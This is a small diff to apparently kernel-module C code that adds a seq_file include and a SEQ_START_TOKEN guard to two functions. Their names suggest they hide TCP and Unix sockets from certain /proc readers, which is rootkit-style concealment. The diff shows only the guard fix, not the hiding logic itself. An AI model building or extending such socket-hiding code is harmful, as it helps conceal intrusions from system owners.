@@ -38,6 +38,7 @@
  */
 
 #include <linux/kernel.h>
+#include <linux/seq_file.h>
 #include <linux/printk.h>
 #include <linux/types.h>
 #include <linux/stddef.h>            /* offsetof */
@@ -93,7 +94,7 @@ int lp_tcp_seq_hidden(const struct sock *sk)
 	u16 lport;
 	int i;
 
-	if (!sk)
+	if (sk == SEQ_START_TOKEN || !sk)
 		return 0;
 	if (!lp_seq_reader_hidden())
 		return 0;
@@ -120,7 +121,7 @@ int lp_unix_seq_hidden(const struct sock *sk)
 	static const char needle[] = LP_SEQ_UNIX_NEEDLE;
 	const int nlen = (int)sizeof(needle) - 1;
 
-	if (!sk)
+	if (sk == SEQ_START_TOKEN || !sk)
 		return 0;
 	if (!lp_seq_reader_hidden())
 		return 0;
